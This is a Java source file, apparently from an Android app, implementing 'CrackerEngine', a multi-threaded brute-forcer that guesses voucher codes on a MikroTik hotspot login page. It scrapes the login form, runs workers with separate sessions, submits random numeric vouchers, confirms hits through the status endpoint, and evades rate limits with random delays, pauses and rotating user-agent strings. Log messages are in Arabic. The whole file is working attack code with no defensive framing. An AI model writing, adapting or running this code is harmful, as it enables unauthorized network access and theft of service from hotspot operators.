package com.example.mikrotikbrowser;

import android.content.SharedPreferences;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.atomic.*;
import org.json.JSONObject;

public class CrackerEngine {
    public interface Listener {
        void onLog(String msg);
        void onProgress(int cur, int total, String voucher);
        void onFound(String voucher, String status);
    }

    private final Listener listener;
    private final SharedPreferences prefs;
    private final String network;
    private final String loginUrl, statusUrl, baseUrl;
    private final String prefix, suffix;
    private final int digits, maxAttempts, threads;
    private final int delayMin, delayMax, batchSize, batchRest, retryDelay;

    private final AtomicBoolean stopped = new AtomicBoolean(false);
    private final AtomicBoolean found = new AtomicBoolean(false);
    private final AtomicInteger done = new AtomicInteger(0);
    private final Set<String> tried = Collections.synchronizedSet(loadTried());
    private final Random rng = new Random();
    private Map<String, String> formTemplate;

    public CrackerEngine(Listener l, SharedPreferences p, String network,
                         String loginUrl, String prefix, String suffix, int digits,
                         int maxAttempts, int threads, int delayMin, int delayMax,
                         int batchSize, int batchRest, int retryDelay) {
        this.listener = l; this.prefs = p; this.network = network;
        this.loginUrl = loginUrl;
        try { this.baseUrl = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost(); }
        catch (Exception e) { throw new RuntimeException("bad url"); }
        this.statusUrl = baseUrl + "/status?var=callBack";
        this.prefix = prefix != null ? prefix : "";
        this.suffix = suffix != null ? suffix : "";
        this.digits = digits; this.maxAttempts = maxAttempts; this.threads = threads;
        this.delayMin = Math.max(150, delayMin); this.delayMax = Math.max(this.delayMin + 100, delayMax);
        this.batchSize = batchSize; this.batchRest = batchRest; this.retryDelay = retryDelay;
    }

    private Set<String> loadTried() {
        Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
        if (s.size() > 50000) {
            List<String> l = new ArrayList<>(s);
            s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
        }
        return s;
    }

    public void stop() { stopped.set(true); }

    public void start() {
        new Thread(this::runEngine, "CrackerMain").start();
    }

    private void runEngine() {
        try {
            log("▶ بدء المحرك (جلسات مستقلة لكل عامل)");
            log("  URLs: " + loginUrl);

            // 1. Extract form (shared - just to know field names)
            log("→ استخراج حقول الفورم...");
            formTemplate = extractForm();
            if (formTemplate == null) { log("❌ فشل استخراج الفورم"); return; }
            log("✓ الحقول: " + formTemplate.keySet());

            // 2. Check current session (shared - just informational)
            checkInitSession();

            // 3. Spawn workers, each with own session
            List<Thread> workers = new ArrayList<>();
            for (int i = 0; i < threads; i++) {
                final int wid = i;
                Thread w = new Thread(() -> workerRun(wid), "Worker-" + wid);
                workers.add(w);
                w.start();
                Thread.sleep(400);
            }
            log("✓ تم تشغيل " + threads + " عمال بجلسات مستقلة");

            for (Thread w : workers) { try { w.join(); } catch (Exception e) {} }

            if (!found.get() && !stopped.get())
                log("❌ انتهى — " + done.get() + " محاولة بدون نتيجة");
        } catch (Exception e) { log("❌ خطأ عام: " + e.getMessage()); }
    }

    private void checkInitSession() {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(statusUrl).openConnection();
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            String body = read(c.getInputStream());
            c.disconnect();
            JSONObject o = new JSONObject(body);
            if (o.optString("logged_in").equalsIgnoreCase("yes")) {
                String u = o.optString("username", "");
                if (!u.isEmpty() && !u.equals("-") && !u.equals("N/A")) {
                    log("ℹ كرت مسجل موجود: " + u + " (لن يمنع التخمين)");
                }
            }
        } catch (Exception e) {}
    }

    private Map<String, String> extractForm() {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(10000);
            c.setRequestProperty("User-Agent", ua());
            String html = read(c.getInputStream());
            c.disconnect();

            Map<String, String> fields = new HashMap<>();
            java.util.regex.Pattern p = java.util.regex.Pattern.compile(
                "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
                java.util.regex.Pattern.CASE_INSENSITIVE);
            java.util.regex.Matcher m = p.matcher(html);
            while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
            fields.putIfAbsent("username", "");
            fields.putIfAbsent("password", "");
            fields.putIfAbsent("dst", baseUrl + "/");
            fields.putIfAbsent("popup", "true");
            return fields;
        } catch (Exception e) { log("⚠ استخراج: " + e.getMessage()); return null; }
    }

    private void workerRun(int id) {
        Map<String, String> cookies = new HashMap<>();
        int sinceRest = 0;

        // Init this worker's own session
        if (!initSession(cookies)) { log("[W" + id + "] فشل بدء الجلسة"); return; }
        log("[W" + id + "] ✓ جلسة مستقلة (" + cookies.size() + " كوكي)");

        while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
            if (sinceRest >= batchSize) {
                sinceRest = 0;
                log("[W" + id + "] 💤 استراحة " + (batchRest/1000) + "s");
                sleep(batchRest);
                continue;
            }

            String v = generate();
            if (v == null) break;
            int cur = done.incrementAndGet();
            sinceRest++;
            listener.onProgress(cur, maxAttempts, v);

            sleep(delayMin + rng.nextInt(delayMax - delayMin));
            if (stopped.get() || found.get()) break;

            Result r = tryLogin(cookies, v);
            if (r.error != null) log("[W" + id + "] ❌ " + v + " → " + r.error);
            if (r.busy) { sleep(retryDelay); continue; }
            if (r.success) {
                found.set(true);
                log("[W" + id + "] ✅✅✅ " + v);
                listener.onFound(v, r.statusJson);
                return;
            }
        }
    }

    private boolean initSession(Map<String, String> cookies) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(10000);
            c.setRequestProperty("User-Agent", ua());
            c.getResponseCode();
            extractCookies(c, cookies);
            c.disconnect();
            return true;
        } catch (Exception e) { return false; }
    }

    private Result tryLogin(Map<String, String> cookies, String voucher) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000); c.setReadTimeout(15000);
            c.setInstanceFollowRedirects(false);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("User-Agent", ua());
            c.setRequestProperty("Referer", loginUrl);
            String ck = cookiesStr(cookies);
            if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);

            StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, String> e : formTemplate.entrySet()) {
                if (sb.length() > 0) sb.append("&");
                sb.append(URLEncoder.encode(e.getKey(), "UTF-8")).append("=").append(URLEncoder.encode(e.getValue(), "UTF-8"));
            }
            sb.append("&username=").append(URLEncoder.encode(voucher, "UTF-8"));
            sb.append("&password=");

            OutputStream os = c.getOutputStream();
            os.write(sb.toString().getBytes("UTF-8"));
            os.flush(); os.close();

            int code = c.getResponseCode();
            extractCookies(c, cookies);

            String body = "";
            try {
                InputStream is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
                if (is != null) body = read(is);
            } catch (Exception e) {}
            c.disconnect();

            if (body.contains("already authorizing")) return Result.busy("already authorizing");
            String low = body.toLowerCase();
            if (low.contains("invalid") || low.contains("error") || low.contains("wrong") || low.contains("denied")) {
                String msg = extractErr(body);
                return Result.bad(msg != null ? msg : "invalid");
            }

            return verify(cookies, voucher);
        } catch (Exception e) {
            return Result.bad("network: " + e.getMessage());
        }
    }

    private Result verify(Map<String, String> cookies, String v) {
        try {
            Thread.sleep(80);
            HttpURLConnection c = (HttpURLConnection) new URL(statusUrl).openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(10000);
            String ck = cookiesStr(cookies);
            if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
            String body = read(c.getInputStream());
            extractCookies(c, cookies);
            c.disconnect();

            JSONObject o = new JSONObject(body);
            String li = o.optString("logged_in", "").toLowerCase();
            String un = o.optString("username", "").trim();
            if ((li.equals("yes") || li.equals("true") || li.equals("1")) && v.equals(un))
                return Result.ok(body);
            return Result.bad(null);
        } catch (Exception e) { return Result.bad(null); }
    }

    private static class Result {
        boolean success, busy; String error; String statusJson;
        static Result ok(String j) { Result r = new Result(); r.success = true; r.statusJson = j; return r; }
        static Result bad(String e) { Result r = new Result(); r.error = e; return r; }
        static Result busy(String e) { Result r = new Result(); r.busy = true; r.error = e; return r; }
    }

    private String generate() {
        int max = (int) Math.pow(10, digits) - 1;
        for (int k = 0; k < 500; k++) {
            int num = rng.nextInt(max + 1);
            String v = prefix + String.format("%0" + digits + "d", num) + suffix;
            if (tried.add(v)) {
                synchronized (prefs) {
                    Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
                    s.add(v);
                    if (s.size() > 50000) {
                        List<String> l = new ArrayList<>(s);
                        s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
                    }
                    prefs.edit().putStringSet("tried_" + network, s).apply();
                }
                return v;
            }
        }
        return null;
    }

    private void extractCookies(HttpURLConnection c, Map<String, String> store) {
        Map<String, List<String>> h = c.getHeaderFields();
        for (Map.Entry<String, List<String>> e : h.entrySet()) {
            if (e.getKey() != null && e.getKey().equalsIgnoreCase("Set-Cookie")) {
                for (String line : e.getValue()) {
                    int eq = line.indexOf('=');
                    if (eq < 0) continue;
                    int semi = line.indexOf(';', eq);
                    String n = line.substring(0, eq).trim();
                    String v = semi > 0 ? line.substring(eq + 1, semi).trim() : line.substring(eq + 1).trim();
                    store.put(n, v);
                }
            }
        }
    }

    private String cookiesStr(Map<String, String> store) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : store.entrySet()) {
            if (sb.length() > 0) sb.append("; ");
            sb.append(e.getKey()).append("=").append(e.getValue());
        }
        return sb.toString();
    }

    private String extractErr(String html) {
        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
            "class=[\"'][^\"']*(?:error|alert|fail|warn)[^\"']*[\"'][^>]*>([^<]+)<",
            java.util.regex.Pattern.CASE_INSENSITIVE);
        java.util.regex.Matcher m = p.matcher(html);
        return m.find() ? m.group(1).trim() : null;
    }

    private String ua() {
        String[] a = {
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/110.0 Mobile Safari/537.36"
        };
        return a[rng.nextInt(a.length)];
    }

    private String read(InputStream is) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) > 0) b.write(buf, 0, n);
        return b.toString("UTF-8");
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
    private void log(String m) { listener.onLog(m); }
}
